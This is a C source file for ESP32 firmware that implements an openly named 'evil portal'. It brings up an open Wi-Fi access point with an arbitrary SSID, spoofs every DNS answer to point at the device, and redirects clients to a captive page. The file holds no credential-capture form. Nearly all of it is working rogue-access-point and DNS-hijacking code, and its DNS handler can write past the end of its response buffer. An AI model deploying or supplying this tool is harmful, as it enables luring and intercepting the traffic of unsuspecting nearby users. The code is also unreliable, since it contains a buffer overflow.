#include "evil_portal.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "lwip/ip4_addr.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "nvs_flash.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "evil_portal";

static httpd_handle_t s_httpd  = NULL;
static uint32_t       s_clients = 0;

static const char s_captive_page[] =
    "<!DOCTYPE html><html><head>"
    "<meta http-equiv='refresh' content='0;url=http://binary-mist.local/portal'>"
    "<title>Portal</title></head><body>"
    "<p>Connecting...</p>"
    "</body></html>";

static esp_err_t root_handler(httpd_req_t *req)
{
    s_clients++;
    ESP_LOGI(TAG, "Client connected, total=%lu", (unsigned long)s_clients);
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/portal");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t portal_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, s_captive_page, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

/* DNS redirect — returns 192.168.4.1 for all queries */
static void dns_redirect_task(void *arg)
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    uint8_t buf[512];
    struct sockaddr_in client;
    socklen_t client_len = sizeof(client);

    while (1) {
        int n = recvfrom(sock, buf, sizeof(buf), 0,
                         (struct sockaddr *)&client, &client_len);
        if (n <= 0) continue;

        /* Build minimal DNS response: all A records -> 192.168.4.1 */
        uint8_t resp[512];
        memcpy(resp, buf, n);
        resp[2] = 0x81; resp[3] = 0x80;  /* QR=1, Opcode=0, AA=1, RA=1 */
        resp[6] = 0x00; resp[7] = 0x01;  /* Answer count = 1 */

        int offset = n;
        resp[offset++] = 0xc0; resp[offset++] = 0x0c; /* name ptr */
        resp[offset++] = 0x00; resp[offset++] = 0x01;  /* type A */
        resp[offset++] = 0x00; resp[offset++] = 0x01;  /* class IN */
        resp[offset++] = 0x00; resp[offset++] = 0x00;
        resp[offset++] = 0x00; resp[offset++] = 0x3c;  /* TTL 60s */
        resp[offset++] = 0x00; resp[offset++] = 0x04;  /* rdlen 4 */
        resp[offset++] = 192; resp[offset++] = 168;
        resp[offset++] = 4;   resp[offset++] = 1;

        sendto(sock, resp, offset, 0, (struct sockaddr *)&client, client_len);
    }
    close(sock);
    vTaskDelete(NULL);
}

esp_err_t evil_portal_start(const char *ssid, const char *redirect_url)
{
    (void)redirect_url;

    /* Configure softAP */
    wifi_config_t cfg = {
        .ap = {
            .max_connection = 4,
            .authmode       = WIFI_AUTH_OPEN,
        }
    };
    strncpy((char *)cfg.ap.ssid, ssid, sizeof(cfg.ap.ssid) - 1);
    cfg.ap.ssid_len = (uint8_t)strlen(ssid);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &cfg));
    ESP_ERROR_CHECK(esp_wifi_start());

    /* HTTP server */
    httpd_config_t http_cfg = HTTPD_DEFAULT_CONFIG();
    http_cfg.server_port = 80;
    ESP_ERROR_CHECK(httpd_start(&s_httpd, &http_cfg));

    httpd_uri_t root = { .uri = "/",       .method = HTTP_GET, .handler = root_handler };
    httpd_uri_t port = { .uri = "/portal", .method = HTTP_GET, .handler = portal_handler };
    httpd_register_uri_handler(s_httpd, &root);
    httpd_register_uri_handler(s_httpd, &port);

    /* DNS redirect task */
    xTaskCreate(dns_redirect_task, "ep_dns", 3072, NULL, 5, NULL);

    ESP_LOGI(TAG, "Evil Portal started, SSID=%s", ssid);
    return ESP_OK;
}

esp_err_t evil_portal_stop(void)
{
    if (s_httpd) { httpd_stop(s_httpd); s_httpd = NULL; }
    esp_wifi_stop();
    return ESP_OK;
}

uint32_t evil_portal_client_count(void) { return s_clients; }
